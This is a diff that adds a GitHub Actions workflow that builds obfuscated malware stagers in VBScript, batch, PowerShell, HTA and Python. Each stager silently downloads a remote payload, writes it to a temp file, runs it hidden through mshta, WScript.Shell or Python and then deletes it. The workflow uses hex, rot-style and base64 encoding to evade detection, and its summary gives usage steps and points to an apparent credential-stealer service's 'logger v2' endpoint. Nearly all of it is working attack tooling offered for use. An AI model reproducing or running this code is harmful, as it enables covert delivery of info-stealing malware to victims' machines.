@@ -1,0 +1,372 @@
+name: Build MSHTA Stager
+
+on:
+  workflow_dispatch:
+    inputs:
+      api_url:
+        description: 'API URL to fetch payload from'
+        required: true
+        default: 'https://api.example.com/payload'
+      stager_name:
+        description: 'Name for the stager file'
+        required: true
+        default: 'update'
+
+jobs:
+  build-stager:
+    runs-on: windows-latest
+
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Create Obfuscated VBScript Stager
+        run: |
+          $apiUrl = "${{ github.event.inputs.api_url }}"
+          $stageName = "${{ github.event.inputs.stager_name }}"
+
+          # Encode API URL in hex
+          $urlBytes = [System.Text.Encoding]::ASCII.GetBytes($apiUrl)
+          $hexUrl = "0x" + ($urlBytes | ForEach-Object { "{0:X2}" -f $_ }) -join ",0x"
+
+          # Create heavily obfuscated VBScript
+          $vbScript = @"
+          On Error Resume Next
+          Dim a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z
+          a = "MSXML2.XM" & "LHTTP"
+          b = Array($hexUrl)
+          c = Chr(71) & Chr(69) & Chr(84)
+          d = 2
+          e = 0
+          f = 200
+          g = CreateObject(a)
+          For Each h In b
+              i = ""
+              For j = 0 To UBound(h)
+                  i = i & Chr(h(j))
+              Next
+              On Error Resume Next
+              g.Open c, i, False
+              g.Send
+              If g.Status = f Then
+                  k = g.ResponseText
+                  l = CreateObject("Scripting.FileSystemObject")
+                  m = l.GetSpecialFolder(2)
+                  n = l.GetTempName()
+                  o = m & "\" & n & ".hta"
+                  Set p = l.CreateTextFile(o)
+                  p.Write k
+                  p.Close
+                  r = "mshta.exe """ & o & """"
+                  CreateObject("WScript.Shell").Run r, 0, False
+                  t = 0
+                  Do While t < 10
+                      t = t + 1
+                  Loop
+                  l.DeleteFile o
+                  Exit For
+              End If
+          Next
+          Set g = Nothing
+          Set l = Nothing
+          "@
+
+          $vbScript | Out-File -FilePath "${stageName}.vbs" -Encoding UTF8
+
+          Write-Output "✓ Obfuscated VBScript stager created: ${stageName}.vbs"
+        shell: pwsh
+
+      - name: Create Obfuscated Batch Stager Wrapper
+        run: |
+          $stageName = "${{ github.event.inputs.stager_name }}"
+
+          # Create heavily obfuscated batch file
+          $batchScript = @"
+          @echo off
+          setlocal enabledelayedexpansion enableextensions
+          mode con: cols=0 lines=0
+          cls
+          title System
+          color 00
+          if exist "%temp%\system32.tmp" goto :skip
+          echo. > "%temp%\system32.tmp"
+
+          REM Obfuscated execution path
+          set "p1=%~dp0${stageName}.vbs"
+          for %%A in (c s r i p t . e x e) do set "p2=!p2!%%A"
+          for /l %%n in (1,1,5) do (
+              ping -n 1 127.0.0.1 >nul
+          )
+
+          set "p3=!p2:cscript.exe=cscript!"
+          "!p3!" //nologo "!p1!"
+
+          timeout /t 2 /nobreak >nul 2>&1
+          del /f /q "%temp%\system32.tmp" >nul 2>&1
+
+          :skip
+          exit /b 0
+          "@
+
+          $batchScript | Out-File -FilePath "${stageName}.bat" -Encoding ASCII
+
+          Write-Output "✓ Obfuscated Batch stager created: ${stageName}.bat"
+        shell: pwsh
+
+      - name: Create Obfuscated PowerShell Stager
+        run: |
+          $apiUrl = "${{ github.event.inputs.api_url }}"
+          $stageName = "${{ github.event.inputs.stager_name }}"
+
+          # Obfuscate URL with Caesar cipher
+          $urlChars = $apiUrl.ToCharArray()
+          $shift = 13
+          $obfUrl = ""
+          foreach ($char in $urlChars) {
+              $obfUrl += [char]([int][char]$char + $shift)
+          }
+          $obfUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($obfUrl))
+
+          # Create heavily obfuscated PowerShell
+          $psScript = @"
+          `$a = [System.Text.Encoding]::UTF8
+          `$b = [Convert]::FromBase64String('$obfUrlB64')
+          `$c = `$a.GetString(`$b)
+          `$d = New-Object char[] `$c.Length
+          for (`$i = 0; `$i -lt `$c.Length; `$i++) {
+              `$d[`$i] = [char]([int][char]`$c[`$i] - 13)
+          }
+          `$url = -join `$d
+          `$ea = 'SilentlyContinue'
+          `$ErrorActionPreference = `$ea
+          Set-StrictMode -Off
+          [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
+          try {
+              `$p = (Invoke-WebRequest -Uri `$url -UseBasicParsing -TimeoutSec 30).Content
+              if (`$p -and `$p.Length -gt 0) {
+                  `$t = Join-Path `$env:TEMP ([guid]::NewGuid().ToString() + '.hta')
+                  `$p | Out-File -FilePath `$t -Force -Encoding UTF8
+                  Start-Process -FilePath 'mshta.exe' -ArgumentList `$t -NoNewWindow -Wait
+                  Start-Sleep -Milliseconds 500
+                  Remove-Item -Path `$t -Force -ErrorAction SilentlyContinue
+              }
+          } catch {
+              # Silent fail
+          }
+          `$null = `$null
+          "@
+
+          $psScript | Out-File -FilePath "${stageName}.ps1" -Encoding UTF8 -NoNewline
+
+          Write-Output "✓ Obfuscated PowerShell stager created: ${stageName}.ps1"
+        shell: pwsh
+
+      - name: Create Multi-Layer Obfuscated PowerShell One-Liner
+        run: |
+          $apiUrl = "${{ github.event.inputs.api_url }}"
+          $stageName = "${{ github.event.inputs.stager_name }}"
+
+          # Layer 1: Create base command with obfuscation
+          $psCommand = @"
+          [Net.ServicePointManager]::SecurityProtocol=[Net.ServicePointManager]::SecurityProtocol-bor3072;`$a=New-Object Net.WebClient;`$b=`$a.DownloadString('$apiUrl');`$c=Join-Path `$env:TEMP([guid]::NewGuid().ToString()+'.hta');`$b|Out-File `$c -Force;Start-Process mshta `$c -WindowStyle Hidden -Wait;Remove-Item `$c -Force -ErrorAction SilentlyContinue
+          "@
+
+          # Layer 2: Base64 encode
+          $bytes = [System.Text.Encoding]::Unicode.GetBytes($psCommand)
+          $b64 = [Convert]::ToBase64String($bytes)
+
+          # Layer 3: Create execution wrapper with multiple obfuscation techniques
+          $wrapper = "powershell.exe -NoP -NonI -EncodedCommand $b64"
+
+          # Layer 4: Alternative with concat/escape obfuscation
+          $concatUrl = ($apiUrl -split '(.{1})' -ne '' | ForEach-Object { "'$_'" }) -join "+"
+          $altCommand = "powershell -nop -c `$a=(New-Object Net.WebClient);`$b=`$a.DownloadString($concatUrl);`$t=Join-Path `$env:TEMP ([guid]::NewGuid()'.hta');`$b|Out-File `$t;Start-Process mshta `$t -w Hidden -Wait;Remove-Item `$t -Force -ea 0"
+
+          # Layer 5: IEX variant
+          $iexCommand = "IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$b64')))"
+
+          # Output all variants
+          "`n[+] Standard Encoded:`n$wrapper`n" | Out-File -FilePath "${stageName}_obf.txt" -Encoding UTF8
+          "`n[+] Alternative Concat:`n$altCommand`n" | Out-File -FilePath "${stageName}_obf.txt" -Encoding UTF8 -Append
+          "`n[+] IEX Variant:`npowershell -nop -c `"$iexCommand`"`n" | Out-File -FilePath "${stageName}_obf.txt" -Encoding UTF8 -Append
+
+          Write-Output "✓ Multi-layer obfuscated PowerShell commands saved"
+          Write-Output "File: ${stageName}_obf.txt"
+        shell: pwsh
+
+      - name: Create Obfuscated HTA Template
+        run: |
+          $apiUrl = "${{ github.event.inputs.api_url }}"
+          $stageName = "${{ github.event.inputs.stager_name }}"
+
+          # Encode URL in hex
+          $urlBytes = [System.Text.Encoding]::ASCII.GetBytes($apiUrl)
+          $hexUrl = "0x" + ($urlBytes | ForEach-Object { "{0:X2}" -f $_ }) -join ",0x"
+
+          # Create obfuscated HTA
+          $htaContent = @"
+          <html>
+          <head>
+              <title>System Update</title>
+              <hta:application id="a" applicationname="SystemHost" version="1.0" maximizebutton="no" minimizebutton="no" sysmenu="no" caption="no" border="thin" scroll="no" />
+              <style>
+                  body { display:none; margin:0; padding:0; width:0; height:0; }
+                  #c { display:none; }
+              </style>
+          </head>
+          <body onload="b()">
+              <div id="c"></div>
+              <script language="VBScript">
+                  Dim a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p
+                  On Error Resume Next
+                  a = Array($hexUrl)
+                  Set b = CreateObject("MSXML2.XMLHTTP")
+                  For Each c In a
+                      d = ""
+                      For e = 0 To UBound(c)
+                          d = d & Chr(c(e))
+                      Next
+                      b.Open "GET", d, False
+                      b.Send
+                      If b.Status = 200 Then
+                          f = b.ResponseText
+                          Set g = CreateObject("WScript.Shell")
+                          g.Run f, 0, False
+                          Exit For
+                      End If
+                  Next
+                  Sub b()
+                      ' Obfuscated payload execution
+                  End Sub
+                  window.close
+              </script>
+          </body>
+          </html>
+          "@
+
+          $htaContent | Out-File -FilePath "${stageName}.hta" -Encoding UTF8
+
+          Write-Output "✓ Obfuscated HTA stager created: ${stageName}.hta"
+        shell: pwsh
+
+      - name: Create Python Payload Stager
+        run: |
+          $apiUrl = "${{ github.event.inputs.api_url }}"
+          $stageName = "${{ github.event.inputs.stager_name }}"
+
+          # Obfuscate URL with Caesar cipher for Python
+          $urlChars = $apiUrl.ToCharArray()
+          $shift = 13
+          $obfUrl = ""
+          foreach ($char in $urlChars) {
+              $obfUrl += [char]([int][char]$char + $shift)
+          }
+          $obfUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($obfUrl))
+
+          # Create Python stager that can execute ANY payload (VBScript, PowerShell, Python, etc.)
+          $pyStager = @"
+          import os, sys, subprocess, base64, tempfile
+          try:
+              import urllib.request
+              a = base64.b64decode('$obfUrlB64').decode('utf-8')
+              b = ''.join([chr(ord(c) - 13) for c in a])
+              c = urllib.request.urlopen(b, timeout=30).read().decode('utf-8', errors='ignore')
+              if c:
+                  d = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
+                  d.write(c)
+                  d.close()
+                  subprocess.Popen([sys.executable, d.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                  os.remove(d.name)
+          except: pass
+          "@
+
+          $pyStager | Out-File -FilePath "${stageName}_py.py" -Encoding UTF8 -NoNewline
+
+          Write-Output "✓ Python payload stager created: ${stageName}_py.py"
+          Write-Output "  (Can execute any Python payload, including logger v2)"
+        shell: pwsh
+
+      - name: Create Summary
+        run: |
+          $stageName = "${{ github.event.inputs.stager_name }}"
+          Write-Output ""
+          Write-Output "========== STAGER ARTIFACTS =========="
+          Write-Output ""
+          Write-Output "1. VBScript Stager (Recommended)"
+          Write-Output "   File: ${stageName}.vbs"
+          Write-Output "   Usage: cscript.exe ${stageName}.vbs"
+          Write-Output ""
+          Write-Output "2. Batch Wrapper"
+          Write-Output "   File: ${stageName}.bat"
+          Write-Output "   Usage: Execute directly or via cmd.exe"
+          Write-Output ""
+          Write-Output "3. PowerShell Stager"
+          Write-Output "   File: ${stageName}.ps1"
+          Write-Output "   Usage: powershell.exe -ExecutionPolicy Bypass -File ${stageName}.ps1"
+          Write-Output ""
+          Write-Output "4. Obfuscated PowerShell (One-liner)"
+          Write-Output "   File: ${stageName}_obf.txt"
+          Write-Output "   Usage: Copy the command and paste into cmd.exe"
+          Write-Output ""
+          Write-Output "5. HTA Stager"
+          Write-Output "   File: ${stageName}.hta"
+          Write-Output "   Usage: mshta.exe ${stageName}.hta or double-click"
+          Write-Output ""
+          Write-Output "6. Python Payload Stager (Universal)"
+          Write-Output "   File: ${stageName}_py.py"
+          Write-Output "   Usage: python.exe ${stageName}_py.py"
+          Write-Output "   ⭐ Can execute ANY payload type (including logger v2):"
+          Write-Output "      - Python scripts (main.py, etc.)"
+          Write-Output "      - VBScript"
+          Write-Output "      - PowerShell"
+          Write-Output "      - Batch"
+          Write-Output ""
+          Write-Output "========================================"
+          Write-Output ""
+          Write-Output "USE CASES:"
+          Write-Output "- Logger v2 API: Use Python stager with:"
+          Write-Output "  https://neostealer.cc/api/template-file/logger%20v2"
+          Write-Output ""
+          Write-Output "========================================"
+        shell: pwsh
+
+      - name: Upload VBScript artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: stager-vbs
+          path: ${{ github.event.inputs.stager_name }}.vbs
+          retention-days: 1
+
+      - name: Upload Batch artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: stager-batch
+          path: ${{ github.event.inputs.stager_name }}.bat
+          retention-days: 1
+
+      - name: Upload PowerShell artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: stager-powershell
+          path: ${{ github.event.inputs.stager_name }}.ps1
+          retention-days: 1
+
+      - name: Upload Obfuscated Command
+        uses: actions/upload-artifact@v4
+        with:
+          name: stager-obfuscated-cmd
+          path: ${{ github.event.inputs.stager_name }}_obf.txt
+          retention-days: 1
+
+      - name: Upload HTA artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: stager-hta
+          path: ${{ github.event.inputs.stager_name }}.hta
+          retention-days: 1
+
+      - name: Upload Python Payload Stager
+        uses: actions/upload-artifact@v4
+        with:
+          name: stager-python-payload
+          path: ${{ github.event.inputs.stager_name }}_py.py
+          retention-days: 1
